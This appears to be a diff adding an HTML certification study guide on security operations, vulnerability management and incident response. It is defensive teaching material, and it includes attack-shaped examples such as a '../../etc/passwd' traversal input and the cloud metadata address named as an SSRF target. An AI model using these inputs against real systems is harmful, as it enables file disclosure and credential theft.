+<h3 id="streamlining-operations">Streamlining operations</h3>
+<ul>
+<li><strong>Automation and orchestration (SOAR)</strong> — orchestration connects tools; automation executes without a human; a <strong>playbook</strong> encodes the decision tree.</li>
+<li><strong>Orchestration playbooks</strong> — codify triage so tier-1 handles more, faster.</li>
+<li><strong>Minimising human engagement</strong> — reserve analyst attention for judgement.</li>
+<li><strong>Single pane of glass</strong> — one console instead of twelve; reduces context switching and missed alerts.</li>
+<li><strong>Technology and tool integration</strong> — <strong>APIs</strong>, webhooks, and <strong>workflow orchestration</strong> are the plumbing.</li>
+</ul>
+<p><strong>Benefits to cite in an exam answer:</strong> reduced <strong>MTTD</strong> and <strong>MTTR</strong>, lower analyst fatigue and turnover, consistent handling, better metrics, and scale without linear headcount growth.</p>
+<p><strong>Risks of over-automation:</strong> an automated containment action that isolates a production database at month-end close causes the outage the attacker wanted. Always ask what the automation does when it&#x27;s <em>wrong</em>.</p>
+<hr>
+<h2 id="domain-1-self-check">Domain 1 self-check</h2>
+<ol>
+<li>Why is a process&#x27;s parent more diagnostic than its name?</li>
+<li>What does DMARC add that SPF and DKIM alone cannot provide?</li>
+<li>Where does &quot;tools&quot; sit on the Pyramid of Pain, and why does that matter?</li>
+<li>You see 60-second-interval outbound connections of identical size. What do you check next before calling it C2?</li>
+<li>Which TLP marking permits sharing with your whole organisation?</li>
+<li>Name three tasks that are good automation candidates and one that is not.</li>
+</ol></section><section class="section" id="02-vulnerability-management"><h1 id="domain-2-vulnerability-management-30">Domain 2 — Vulnerability Management (30%)</h1>
+<p>Finding weaknesses, deciding which ones actually matter, and driving them to closure. The exam cares far more about <strong>prioritisation and validation</strong> than about running a scanner.</p>
+<hr>
+<h2 id="2-1-vulnerability-discovery-and-scanning">2.1 Vulnerability discovery and scanning</h2>
+<h3 id="asset-discovery">Asset discovery</h3>
+<p>You cannot scan what you don&#x27;t know about.</p>
+<ul>
+<li><strong>Asset mapping / inventory</strong> — the foundation of the whole domain. An unmanaged asset is an unpatched asset.</li>
+<li><strong>Passive discovery</strong> — listens to traffic (span/tap, DHCP, ARP). Zero impact, finds only what talks.</li>
+<li><strong>Active discovery</strong> — sends probes (ping sweep, port scan). Complete, but generates traffic and can disturb fragile devices.</li>
+</ul>
+<h3 id="scan-types">Scan types</h3>
+<div class="tw"><table><thead><tr><th>Type</th><th>Description</th><th>Trade-off</th></tr></thead><tbody><tr><td><strong>Credentialed</strong></td><td>Scanner authenticates to the host</td><td>Far more accurate, fewer false positives, sees patch level directly. Requires credential management</td></tr><tr><td><strong>Non-credentialed</strong></td><td>Probes from outside</td><td>Shows the attacker&#x27;s view; more false positives</td></tr><tr><td><strong>Agent-based</strong></td><td>Software on the endpoint reports in</td><td>Works for roaming/remote assets; no network load; needs deployment</td></tr><tr><td><strong>Agentless</strong></td><td>Scanner reaches out over the network</td><td>Nothing to deploy; misses assets that are offline at scan time</td></tr><tr><td><strong>Internal</strong></td><td>Inside the perimeter</td><td>Shows lateral-movement risk</td></tr><tr><td><strong>External</strong></td><td>From the internet</td><td>Shows the attack surface an outsider sees</td></tr><tr><td><strong>Passive</strong></td><td>Traffic observation</td><td>No disruption; incomplete</td></tr><tr><td><strong>Active</strong></td><td>Direct probing</td><td>Complete; potentially disruptive</td></tr></tbody></table></div>
+<p><strong>Static vs dynamic analysis (application security):</strong></p>
+<ul>
+<li><strong>SAST</strong> — static; reads source code without running it. Early in the SDLC, finds injection patterns and hardcoded secrets. Prone to false positives.</li>
+<li><strong>DAST</strong> — dynamic; attacks the running application. Finds runtime and config issues, no source needed. Can&#x27;t see un-exercised code paths.</li>
+<li><strong>IAST</strong> — instruments the running app; combines both.</li>
+<li><strong>SCA (software composition analysis)</strong> — inventories third-party dependencies against known CVEs. Produces an <strong>SBOM</strong>.</li>
+<li><strong>Fuzzing</strong> — malformed/random input to trigger crashes; finds memory-safety bugs and unhandled exceptions.</li>
+<li><strong>Reverse engineering</strong> — disassembly/decompilation of binaries.</li>
+<li><strong>Debugging</strong> — stepping through execution to confirm exploitability.</li>
+</ul>
+<h3 id="industry-frameworks-and-standards">Industry frameworks and standards</h3>
+<ul>
+<li><strong>OWASP Top 10</strong> — the web application risk list.</li>
+<li><strong>ASVS (Application Security Verification Standard)</strong> — tiered requirements.</li>
+<li><strong>PCI DSS</strong> — cardholder data; mandates quarterly ASV scans plus scans after significant change.</li>
+<li><strong>CIS Benchmarks</strong> — configuration hardening baselines.</li>
+<li><strong>DISA STIG</strong> — US DoD hardening guides.</li>
+<li><strong>ISO/IEC 27001</strong> — ISMS certification.</li>
+<li><strong>NIST CSF</strong> — Identify, Protect, Detect, Respond, Recover (+ Govern in 2.0).</li>
+</ul>
+<h3 id="special-considerations">Special considerations</h3>
+<ul>
+<li><strong>Scheduling and scan windows</strong> — avoid month-end, backup windows, and business-critical periods.</li>
+<li><strong>Operations / performance impact</strong> — scanning can knock over legacy devices, printers, and medical or ICS equipment. Some assets should only ever be scanned passively.</li>
+<li><strong>Sensitivity levels and segmentation</strong> — a scanner needs a route to the target; segmentation that blocks the scanner also hides the vulnerability.</li>
+<li><strong>Regulatory requirements</strong> — dictate frequency and evidence.</li>
+<li><strong>Critical infrastructure / ICS / SCADA</strong> — active scanning may cause physical consequences. Passive only, unless you have a test environment.</li>
+<li><strong>Non-traditional assets</strong> — IoT, embedded, RTOS, medical devices. Often unpatchable; you compensate with segmentation and monitoring.</li>
+</ul>
+<hr>
+<h2 id="2-2-output-from-vulnerability-assessment-tools">2.2 Output from vulnerability assessment tools</h2>
+<h3 id="tool-categories">Tool categories</h3>
+<div class="tw"><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>Nessus / Tenable, Qualys, OpenVAS, Rapid7 Nexpose</strong></td><td>General network vulnerability scanners</td></tr><tr><td><strong>Nikto</strong></td><td>Web server misconfiguration scanner</td></tr><tr><td><strong>Burp Suite / OWASP ZAP</strong></td><td>Web application proxies and DAST</td></tr><tr><td><strong>Arachni, w3af</strong></td><td>Web application scanners</td></tr><tr><td><strong>Nmap</strong></td><td>Host discovery, port/service/version detection, NSE scripts</td></tr><tr><td><strong>Angry IP Scanner, hping</strong></td><td>Discovery and packet crafting</td></tr><tr><td><strong>Trivy, Grype, Clair, Anchore</strong></td><td>Container image scanning</td></tr><tr><td><strong>Prowler, Scout Suite, Pacu</strong></td><td>Cloud configuration assessment (Pacu is offensive AWS)</td></tr><tr><td><strong>Maltego, Recon-ng, theHarvester, Shodan, censys</strong></td><td>OSINT and attack-surface discovery</td></tr><tr><td><strong>Wireless: Aircrack-ng, Reaver, oclHashcat</strong></td><td>Wireless assessment and cracking</td></tr><tr><td><strong>Debuggers: GDB, Immunity, OllyDbg, WinDbg</strong></td><td>Binary analysis</td></tr><tr><td><strong>Multipurpose: Metasploit, Cobalt Strike, Nikto, hping</strong></td><td>Exploitation frameworks</td></tr><tr><td><strong>Cloud: ScoutSuite, Prowler, Pacu</strong></td><td>Cloud posture</td></tr><tr><td><strong>SCAP tools</strong></td><td>Automated compliance checking</td></tr></tbody></table></div>
+<h3 id="reading-scanner-output">Reading scanner output</h3>
+<p>A finding gives you: <strong>plugin/check ID</strong>, <strong>CVE</strong>, <strong>CVSS vector and score</strong>,</p>
+<p><strong>affected host/port/service</strong>, <strong>evidence</strong>, <strong>remediation</strong>. Your job is to decide whether it is <em>real</em>, <em>reachable</em>, and <em>worth acting on now</em>.</p>
+<p><strong>Validation is mandatory before escalation.</strong></p>
+<ul>
+<li><strong>True positive</strong> — the vulnerability exists. Act.</li>
+<li><strong>False positive</strong> — reported but not present (very common with non-credentialed scans and back-ported patches: RHEL back-ports fixes without changing the version banner, so version-based checks scream about a patched box).</li>
+<li><strong>True negative</strong> — correctly reported as absent.</li>
+<li><strong>False negative</strong> — present but missed. The most dangerous outcome, and the reason you don&#x27;t rely on a single tool.</li>
+</ul>
+<p><strong>Reconciling results:</strong> compare against your own asset inventory, correlate across two tools, and confirm with manual testing where the stakes justify it.</p>
+<hr>
+<h2 id="2-3-prioritising-vulnerabilities">2.3 Prioritising vulnerabilities</h2>
+<h3 id="cvss-common-vulnerability-scoring-system">CVSS — Common Vulnerability Scoring System</h3>
+<p><strong>Base metrics (CVSS v3.1) — the ones you must be able to read from a vector:</strong></p>
+<div class="tw"><table><thead><tr><th>Metric</th><th>Values</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>AV</strong> Attack Vector</td><td>N / A / L / P</td><td>Network, Adjacent, Local, Physical</td></tr><tr><td><strong>AC</strong> Attack Complexity</td><td>L / H</td><td>Low, High</td></tr><tr><td><strong>PR</strong> Privileges Required</td><td>N / L / H</td><td>None, Low, High</td></tr><tr><td><strong>UI</strong> User Interaction</td><td>N / R</td><td>None, Required</td></tr><tr><td><strong>S</strong> Scope</td><td>U / C</td><td>Unchanged, Changed (Changed = it escapes its security authority — always worse)</td></tr><tr><td><strong>C/I/A</strong></td><td>H / L / N</td><td>Confidentiality, Integrity, Availability impact</td></tr></tbody></table></div>
+<p>Example vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> — <strong>9.8 Critical</strong>. Network-reachable, easy, no privileges, no user interaction, total impact. This is the shape of every internet-facing catastrophe.</p>
+<p><strong>Severity bands:</strong> 0.0 None · 0.1–3.9 Low · 4.0–6.9 Medium · 7.0–8.9 High · 9.0–10.0 Critical.</p>
+<p><strong>Temporal metrics</strong> — exploit code maturity, remediation level, report confidence. These change over time.</p>
+<p><strong>Environmental metrics</strong> — let <em>you</em> re-weight C/I/A for <em>your</em> business context. A high-availability-impact bug on a system with no availability requirement drops in your environment.</p>
+<p><strong>CVSS v4.0</strong> restructures this into Base / Threat / Environmental / Supplemental, and splits impact into Vulnerable System and Subsequent System.</p>
+<h3 id="beyond-cvss">Beyond CVSS</h3>
+<p>CVSS measures <strong>severity</strong>, not <strong>risk</strong>. Risk = severity × exploitability × asset value × exposure. The exam wants you to know CVSS alone is insufficient.</p>
+<ul>
+<li><strong>EPSS (Exploit Prediction Scoring System)</strong> — probability the vulnerability will be exploited in the next 30 days. Excellent prioritisation companion.</li>
+<li><strong>CISA KEV (Known Exploited Vulnerabilities) catalogue</strong> — confirmed in-the-wild exploitation. A KEV-listed medium beats a non-KEV critical.</li>
+<li><strong>Asset value / criticality</strong> — a 9.8 on a decommissioned lab box loses to a 6.5 on the payment gateway.</li>
+<li><strong>Context awareness</strong> — internal vs external exposure, compensating controls already in place, and whether the vulnerable component is even reachable.</li>
+<li><strong>Zero-day</strong> — no patch exists. Mitigate with compensating controls: virtual patching at the WAF/IPS, segmentation, disabling the feature.</li>
+<li><strong>Weaponised exploit availability</strong> — a Metasploit module in existence changes the calculus immediately.</li>
+</ul>
+<h3 id="common-vulnerability-classes-you-must-recognise">Common vulnerability classes you must recognise</h3>
+<p><strong>Injection</strong></p>
+<ul>
+<li><strong>SQL injection</strong> — untrusted input into a query. Fix: <strong>parameterised queries / prepared statements</strong> (input validation alone is not the answer the exam wants). Blind SQLi infers via boolean or timing responses.</li>
+<li><strong>Command injection</strong> — input reaching a shell.</li>
+<li><strong>LDAP / XML injection</strong>, <strong>XXE</strong> (XML External Entity → file read, SSRF).</li>
+<li><strong>Insecure deserialisation</strong> — untrusted serialised objects → RCE.</li>
+</ul>
+<p><strong>Web</strong></p>
+<ul>
+<li><strong>XSS</strong> — reflected (in the response to a crafted request), stored (persisted, hits every viewer, most severe), DOM-based (client-side only, never touches the server). Fix: contextual output encoding + CSP.</li>
+<li><strong>CSRF/XSRF</strong> — forces an authenticated user&#x27;s browser to act. Fix: anti-CSRF tokens, SameSite cookies.</li>
+<li><strong>SSRF</strong> — server fetches an attacker-chosen URL; in cloud, targets the metadata endpoint <code>169.254.169.254</code> to steal instance credentials. IMDSv2 mitigates.</li>
+<li><strong>Directory traversal</strong> — <code>../../etc/passwd</code>.</li>
+<li><strong>Local/remote file inclusion (LFI/RFI)</strong>.</li>
+<li><strong>Broken access control</strong> — <strong>IDOR</strong> (change the ID in the URL, get someone else&#x27;s record). #1 on the OWASP Top 10 2021.</li>
+<li><strong>Session hijacking / cookie theft</strong> — mitigate with <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, short expiry, rotation on privilege change.</li>
+</ul>
+<p><strong>Memory and binary</strong></p>
+<ul>
+<li><strong>Buffer overflow</strong> (stack/heap) — mitigations: ASLR, DEP/NX, stack canaries, memory-safe languages.</li>
+<li><strong>Integer overflow</strong>, <strong>use-after-free</strong>, <strong>NULL pointer dereference</strong>.</li>
+<li><strong>Race condition / TOCTOU</strong> — check happens, then state changes, then use.</li>
+</ul>
+<p><strong>Identity and crypto</strong></p>
+<ul>
+<li><strong>Broken authentication</strong>, credential stuffing, password spraying.</li>
+<li><strong>Weak/insecure cryptography</strong> — MD5/SHA-1 collisions, DES/3DES, RC4, SSLv3/TLS 1.0/1.1, hardcoded keys.</li>
+<li><strong>Improper error handling</strong> — verbose errors leaking internals.</li>
+</ul>
+<p><strong>Privilege escalation</strong></p>
+<ul>
+<li><strong>Vertical</strong> — user → admin. <strong>Horizontal</strong> — user → another user&#x27;s data.</li>
+<li>Windows: unquoted service paths, weak service permissions, DLL hijacking, token impersonation, <code>AlwaysInstallElevated</code>.</li>
+<li>Linux: <code>setuid</code> binaries, writable <code>PATH</code> entries, <code>sudo</code> misconfiguration, cron jobs running scripts from writable directories, kernel exploits.</li>
+</ul>
+<p><strong>Cloud and supply chain</strong></p>
+<ul>
+<li><strong>Misconfigured storage</strong> (public buckets), over-permissive IAM roles, exposed management interfaces, unencrypted snapshots.</li>
+<li><strong>Supply chain</strong> — compromised dependency, typosquatted package, build-system compromise. <strong>SBOM</strong> is the visibility control.</li>
+<li><strong>Rootkits</strong> — kernel/firmware persistence below the OS.</li>
+</ul>
+<hr>
+<h2 id="2-4-controls-to-mitigate-attacks-and-software-vulnerabilities">2.4 Controls to mitigate attacks and software vulnerabilities</h2>
+<h3 id="cross-site-scripting">Cross-site scripting</h3>
+<p>Input validation, <strong>output encoding</strong> (context-specific), Content Security Policy, <code>HttpOnly</code> cookies, framework auto-escaping.</p>
+<h3 id="injection">Injection</h3>
+<p>Parameterised queries, stored procedures, least-privilege database accounts, allowlist input validation, ORMs used correctly.</p>
+<h3 id="overflows">Overflows</h3>
+<p>ASLR, DEP/NX, stack canaries, bounds checking, safe library functions, memory-safe languages.</p>
+<h3 id="data-poisoning">Data poisoning</h3>
+<p>Validate and provenance-check training/reference data; monitor for anomalous model inputs.</p>
+<h3 id="broken-access-control">Broken access control</h3>
+<p>Deny by default, enforce authorisation <strong>server-side</strong> on every request, mandatory access control where warranted, and never rely on hidden UI elements.</p>
+<h3 id="cryptographic-failures">Cryptographic failures</h3>
+<p>Strong current algorithms (AES-256, SHA-256+, TLS 1.2/1.3), proper key management and rotation, salted adaptive password hashing (bcrypt, scrypt, Argon2 — never plain SHA), certificate lifecycle management.</p>
+<h3 id="insecure-design-and-misconfiguration">Insecure design and misconfiguration</h3>
+<p>Threat modelling in design, secure defaults, hardened baselines, remove sample apps and default accounts, disable directory listing.</p>
+<h3 id="identification-and-authentication-failures">Identification and authentication failures</h3>
+<p>MFA, credential rotation, account lockout/throttling, session management, breached-password checks.</p>
+<h3 id="software-and-data-integrity-failures">Software and data integrity failures</h3>
+<p>Code signing, dependency pinning and verification, SBOM, secure CI/CD, SRI for client-side scripts.</p>
+<h3 id="security-logging-and-monitoring-failures">Security logging and monitoring failures</h3>
+<p>Log the security-relevant events, centralise them, protect their integrity, alert on them, and test that alerting actually works.</p>
+<h3 id="ssrf">SSRF</h3>
+<p>Allowlist outbound destinations, block link-local ranges, disable unused URL schemes, enforce IMDSv2.</p>
+<h3 id="secure-coding-practices">Secure coding practices</h3>
+<p>Input validation, output encoding, session management, authentication, data protection, parameterised queries, error handling, code review, <strong>secure SDLC</strong> with security gates at each phase.</p>
+<hr>
+<h2 id="2-5-vulnerability-response-handling-and-management">2.5 Vulnerability response, handling, and management</h2>
+<h3 id="governance-and-context">Governance and context</h3>
+<ul>
+<li><strong>Compensating controls</strong> — when you cannot patch (legacy, vendor-locked, unpatchable device), you reduce risk another way: segmentation, WAF/IPS virtual patch, disabling the feature, enhanced monitoring, access restriction. This is the most-tested concept in the objective.</li>
+<li><strong>Control types</strong> — <em>managerial</em> (policy, risk assessment), <em>operational</em> (training, IR process), <em>technical</em> (firewall, EDR). Also by function: preventive, detective, corrective, deterrent, compensating, physical.</li>
+<li><strong>Patching and configuration management</strong> — standard, emergency, and out-of-cycle patching lanes. Test in staging, stage the rollout, keep a rollback plan.</li>
+<li><strong>Maintenance windows</strong> — negotiated with the business, not imposed.</li>
+<li><strong>Exceptions</strong> — documented, time-bounded, risk-accepted by the right owner, with a review date. An exception without an expiry is just an unmanaged risk.</li>
+<li><strong>Risk management principles</strong> — <strong>accept</strong>, <strong>transfer</strong> (insurance, contracts), <strong>avoid</strong> (stop doing the activity), <strong>mitigate</strong> (controls). Note there is no &quot;eliminate&quot;: <strong>residual risk</strong> always remains.</li>
+<li><strong>Policies, governance, and SLOs</strong> — remediation SLAs by severity, e.g. Critical 7 days / High 30 / Medium 90. Know that the exam expects <em>documented, measured</em> timelines.</li>
+<li><strong>Prioritisation and escalation</strong> — escalate when the SLA will be breached, when the business must accept risk, or when remediation needs downtime.</li>
+<li><strong>Attack surface management</strong> — continuous discovery: <strong>EASM</strong> (external attack surface), <strong>bug bounty</strong>, <strong>attack surface reduction</strong> (remove services, close ports, decommission).</li>
+<li><strong>Secure coding best practices</strong> and <strong>secure SDLC</strong> shift the fix left.</li>
+<li><strong>Threat modelling</strong> — STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege), PASTA, attack trees.</li>
+<li><strong>Third-party / supply chain assessment</strong> — vendor questionnaires, SOC 2 reports, contractual security requirements, SBOM demands.</li>
+</ul>
+<h3 id="the-vulnerability-management-lifecycle">The vulnerability management lifecycle</h3>
+<ol>
+<li><strong>Identify</strong> assets and scope.</li>
+<li><strong>Scan</strong> and discover.</li>
+<li><strong>Validate</strong> — remove false positives before anyone spends effort.</li>
+<li><strong>Prioritise</strong> — CVSS + EPSS + KEV + asset value + exposure.</li>
+<li><strong>Report and assign</strong> to the owning team.</li>
+<li><strong>Remediate</strong> (patch), <strong>mitigate</strong> (compensating control), or <strong>accept</strong> (documented exception).</li>
+<li><strong>Verify</strong> with a rescan. <em>Remediation is not complete until verified.</em></li>
+<li><strong>Report metrics</strong> and feed lessons back into the process.</li>
+</ol>
+<h3 id="metrics-that-matter">Metrics that matter</h3>
+<ul>
+<li><strong>Mean time to remediate (MTTR)</strong> by severity.</li>
+<li><strong>SLA compliance rate</strong> — percentage closed within policy.</li>
+<li><strong>Recurrence rate</strong> — vulnerabilities reappearing means a broken build image or a config management gap, not a patching gap.</li>
+<li><strong>Scan coverage</strong> — percentage of known assets actually scanned. Low coverage invalidates every other metric.</li>
+<li><strong>Vulnerability age distribution</strong> and <strong>risk burn-down</strong> over time.</li>
+</ul>
+<hr>
+<h2 id="domain-2-self-check">Domain 2 self-check</h2>
+<ol>
+<li>Why does a credentialed scan produce fewer false positives?</li>
+<li>A RHEL box reports a vulnerable OpenSSH version but the patch is applied. What happened, and what type of finding is this?</li>
+<li>Read <code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code> — what does <code>S:C</code> change?</li>
+<li>Which is more urgent: CVSS 9.1 not in KEV with EPSS 0.2%, or CVSS 6.4 listed in KEV with a public Metasploit module? Justify it.</li>
+<li>You cannot patch a medical device. Name four compensating controls.</li>
+<li>When is a remediation ticket allowed to close?</li>
+</ol></section><section class="section" id="03-incident-response"><h1 id="domain-3-incident-response-and-management-20">Domain 3 — Incident Response and Management (20%)</h1>
+<p>Frameworks for understanding attacks, and the disciplined process for handling them. Heavy on <strong>order of operations</strong> — the exam loves &quot;what do you do <em>first</em>&quot;.</p>
+<hr>
+<h2 id="3-1-attack-methodology-frameworks">3.1 Attack methodology frameworks</h2>
+<h3 id="cyber-kill-chain-lockheed-martin-7-linear-stages">Cyber Kill Chain (Lockheed Martin) — 7 linear stages</h3>
+<ol>
+<li><strong>Reconnaissance</strong> — target research, OSINT, scanning.</li>
+<li><strong>Weaponisation</strong> — pair exploit with payload (malicious doc, loader).</li>
+<li><strong>Delivery</strong> — email, web, USB, supply chain.</li>
+<li><strong>Exploitation</strong> — trigger the vulnerability.</li>
+<li><strong>Installation</strong> — persistence (backdoor, service, scheduled task).</li>
+<li><strong>Command and Control (C2)</strong> — the channel back to the operator.</li>
+<li><strong>Actions on Objectives</strong> — exfiltration, encryption, destruction.</li>
+</ol>
+<p><em>Strength:</em> simple, communicates well to management.</p>
+<p><em>Weakness:</em> linear and perimeter/malware-centric; poor fit for insider threat or credential-only attacks with no malware at all.</p>
+<h3 id="mitre-att-ck">MITRE ATT&amp;CK</h3>
+<p>A <strong>matrix</strong>, not a sequence: <strong>Tactics</strong> (the adversary&#x27;s goal — the columns) × <strong>Techniques</strong> (how they achieve it) × <strong>Sub-techniques</strong> × <strong>Procedures</strong> (actual observed implementations).</p>
+<p>Enterprise tactics in rough order: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.</p>
+<p><strong>Why analysts use it:</strong> a shared vocabulary (T1059.001 = PowerShell), detection coverage mapping (where are my blind spots?), threat-actor profiling, and purple team planning. Related: <strong>D3FEND</strong> (defensive countermeasures),</p>
+<p><strong>MITRE Engage</strong> (adversary engagement/deception), <strong>CAR</strong> (analytics).</p>
+<h3 id="diamond-model-of-intrusion-analysis">Diamond Model of Intrusion Analysis</h3>
+<p>Four vertices, every event connects all four:</p>
+<pre><code>        Adversary
+           /\
+          /  \
+Infrastructure — Capability     (meta-features: timestamp, phase,
+          \  /                   result, direction, methodology,
+           \/                    resources)
+         Victim</code></pre>
+<p><strong>Pivoting</strong> is the point: from one known vertex you discover the others. Found malware (Capability)? Pivot to the C2 domain (Infrastructure), then to every other victim contacting it, then to the actor behind it.</p>
+<h3 id="open-source-security-testing-methodology-manual-osstmm">Open Source Security Testing Methodology Manual (OSSTMM)</h3>
+<p>A peer-reviewed methodology for security testing and metrics; defines operational security measurement across channels (human, physical, wireless, telecom, data networks).</p>
+<h3 id="owasp-testing-guide-web-security-testing-guide">OWASP Testing Guide / Web Security Testing Guide</h3>
+<p>Structured methodology for testing web applications — the counterpart to the Top 10 risk list.</p>
+<h3 id="others-worth-recognising">Others worth recognising</h3>
+<ul>
+<li><strong>Unified Kill Chain</strong> — 18 phases; merges kill chain and ATT&amp;CK, fixes the linearity problem.</li>
+<li><strong>NIST SP 800-115</strong> — technical guide to information security testing.</li>
+<li><strong>Pyramid of Pain</strong> — how much it hurts the adversary when you detect at each indicator level (see Domain 1).</li>
+</ul>
+<hr>
+<h2 id="3-2-incident-response-activities">3.2 Incident response activities</h2>
+<p>The exam follows <strong>NIST SP 800-61</strong> — four phases, and note that the middle phase loops back:</p>
+<pre><code>Preparation → Detection &amp; Analysis → Containment, Eradication &amp; Recovery
+                     ↑                              |
+                     └──────────────────────────────┘
+                              ↓
+                    Post-Incident Activity</code></pre>
+<p><em>(SANS teaches six: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned. Same content, different partitioning.)</em></p>
+<h3 id="detection-and-analysis">Detection and analysis</h3>
+<ul>
+<li><strong>IOC (Indicator of Compromise)</strong> — evidence something already happened.</li>
+<li><strong>IOA (Indicator of Attack)</strong> — behaviour suggesting an attack in progress. IOAs catch novel attacks; IOCs catch known ones.</li>
+<li><strong>Evidence acquisition</strong> — the order matters enormously.</li>
+</ul>
+<p><strong>Order of volatility</strong> (RFC 3227) — collect most volatile first:</p>
+<ol>
+<li>CPU registers and cache</li>
+<li>Routing table, ARP cache, process table, kernel statistics, <strong>memory (RAM)</strong></li>
+<li>Temporary file systems</li>
+<li><strong>Disk</strong></li>
+<li>Remote logging and monitoring data</li>
+<li>Physical configuration and network topology</li>
+<li>Archival media</li>
+</ol>
+<p>Pulling the plug destroys 1–3. If you need memory, <strong>capture memory before powering down</strong> — encryption keys, injected code, and network connections live only there.</p>
+<ul>
+<li><strong>Chain of custody</strong> — an unbroken documented record of who had the evidence, when, and why. Every transfer is signed. A gap can render evidence inadmissible. Include: collector, date/time, description, hash, storage location, every handoff.</li>
+<li><strong>Hashing</strong> — hash evidence at acquisition and verify after; a matching hash proves integrity. Use SHA-256.</li>
+<li><strong>Write blockers</strong> — hardware devices preventing any write to the original media. Always image the copy, never analyse the original.</li>
+<li><strong>Legal hold</strong> — suspends routine deletion when litigation is anticipated.</li>
+<li><strong>Data and log analysis</strong> — build the timeline; the timeline <em>is</em> the investigation.</li>
+</ul>
+<p><strong>Validating an incident:</strong> confirm it is real (not a false positive), determine <strong>scope</strong> (how many hosts, which accounts, what data), establish</p>
+<p><strong>patient zero</strong> and the <strong>initial access vector</strong>, and identify what the adversary did.</p>
+<h3 id="containment">Containment</h3>
+<p>Stop the bleeding without destroying evidence or tipping off the adversary.</p>
+<ul>
+<li><strong>Segmentation / isolation</strong> — network-isolate the host (EDR isolation keeps the box up and forensically intact — usually the <em>right first move</em> on a workstation).</li>
+<li><strong>Short-term vs long-term containment</strong> — quick isolation now; a rebuilt, hardened, monitored environment later.</li>
+<li><strong>Disabling accounts</strong> — for credential compromise.</li>
+<li><strong>Trade-off to name in an answer:</strong> immediate containment stops damage but may alert the adversary and destroy volatile evidence. Delayed containment preserves intelligence but risks further loss. The business decides the balance; you present the options.</li>
+</ul>
+<h3 id="eradication-and-recovery">Eradication and recovery</h3>
+<ul>
+<li><strong>Eradication</strong> — remove the adversary&#x27;s footholds: malware, backdoors, persistence mechanisms, unauthorised accounts, and <strong>the vulnerability that allowed entry</strong>. Eradication without closing the entry point guarantees reinfection.</li>
+<li><strong>Reconstruction / reimaging</strong> — the only trustworthy remediation for a root-level or kernel-level compromise. You cannot &quot;clean&quot; a rootkitted host with confidence.</li>
+<li><strong>Secure disposal</strong> — sanitise media that held sensitive data.</li>
+<li><strong>Patching</strong> — apply the fix that closes the vector.</li>
+<li><strong>Restoration of permissions</strong> and <strong>credential rotation</strong> — rotate every credential the adversary could have touched, including service accounts, the KRBTGT account (twice, for Golden Ticket), and API keys.</li>
+<li><strong>Verification of logging / communication to security monitoring</strong> — confirm the rebuilt host is reporting into the SIEM before you call it recovered.</li>
+<li><strong>Validation</strong> — scan and monitor the restored system before returning it to production; then monitor it <em>more closely than normal</em> for a period.</li>
+</ul>
+<p><strong>Restoring from backup:</strong> verify the backup predates the compromise. Restoring a backup that already contains the backdoor is a classic mistake — and with ransomware, the dwell time before encryption is often weeks.</p>
+<h3 id="incident-response-phases-in-practice-first-actions">Incident response phases in practice — first actions</h3>
+<p>The exam&#x27;s recurring pattern: the <em>first</em> step is almost always <strong>verify / identify scope</strong> or <strong>preserve evidence</strong>, not &quot;reimage&quot; and not &quot;notify the press&quot;. When containment is the question, isolation beats power-off.</p>
+<hr>
+<h2 id="3-3-preparation-and-post-incident-activity">3.3 Preparation and post-incident activity</h2>
+<h3 id="preparation">Preparation</h3>
+<ul>
+<li><strong>Incident response plan</strong> — roles, authority, decision thresholds, escalation paths. Written before you need it.</li>
+<li><strong>Playbooks / runbooks</strong> — per-scenario procedures (ransomware, BEC, data breach, insider, DDoS). A playbook is the tested version of good intentions.</li>
+<li><strong>Tooling</strong> — jump bag/kit, forensic workstation, write blockers, imaging tools, out-of-band communications.</li>
+<li><strong>Training and testing</strong> — <strong>tabletop exercises</strong> (discussion-based, cheapest, finds process gaps), <strong>simulations</strong>, <strong>red/blue/purple teaming</strong>, <strong>penetration testing</strong>.</li>
+<li><strong>Business continuity (BCP) and disaster recovery (DR)</strong> — with <strong>RTO</strong> (how long until restored) and <strong>RPO</strong> (how much data loss is tolerable).</li>
+<li><strong>Communication plan</strong> — including <strong>out-of-band</strong> channels. If the adversary is in your email and Teams, coordinating the response there hands them your playbook. This is a favourite exam point.</li>
+<li><strong>Documentation and evidence handling procedures</strong> defined in advance.</li>
+</ul>
+<h3 id="post-incident-activity">Post-incident activity</h3>
+<ul>
+<li><strong>Forensic analysis</strong> — the full technical reconstruction.</li>
+<li><strong>Root cause analysis</strong> — not &quot;the user clicked the link&quot; but <em>why</em> the link arrived, why the attachment executed, why it reached the internet, and why nothing alerted. Ask why until you reach something you can fix structurally.</li>
+<li><strong>Lessons learned</strong> — held promptly (while memory is fresh), <strong>blameless</strong>, and producing <strong>assigned actions with owners and dates</strong>. A lessons-learned meeting that generates no tracked actions was a meeting, not an improvement.</li>
+<li><strong>Incident report</strong> — the durable record (see Domain 4).</li>
+<li><strong>Indicator of compromise generation</strong> — turn what you learned into detections and share them.</li>
+<li><strong>Monitoring</strong> — enhanced watch on affected systems post-recovery.</li>
+</ul>
+<h3 id="incident-classification-and-severity">Incident classification and severity</h3>
+<p>Score incidents on <strong>functional impact</strong> (effect on operations), <strong>information impact</strong> (data confidentiality/integrity affected), and <strong>recoverability</strong> (effort and time to recover). Those three drive severity, which drives who gets woken up.</p>
+<h3 id="metrics">Metrics</h3>
+<ul>
+<li><strong>MTTD</strong> — mean time to detect</li>
+<li><strong>MTTA</strong> — mean time to acknowledge</li>
+<li><strong>MTTR</strong> — mean time to respond/recover/remediate (define which you mean)</li>
+<li><strong>Dwell time</strong> — attacker presence before detection; the headline number</li>
+<li><strong>Alert volume, escalation rate, false positive rate</strong></li>
+</ul>
+<hr>
+<h2 id="domain-3-self-check">Domain 3 self-check</h2>
+<ol>
+<li>Order these by volatility: disk, ARP cache, archival backups, RAM.</li>
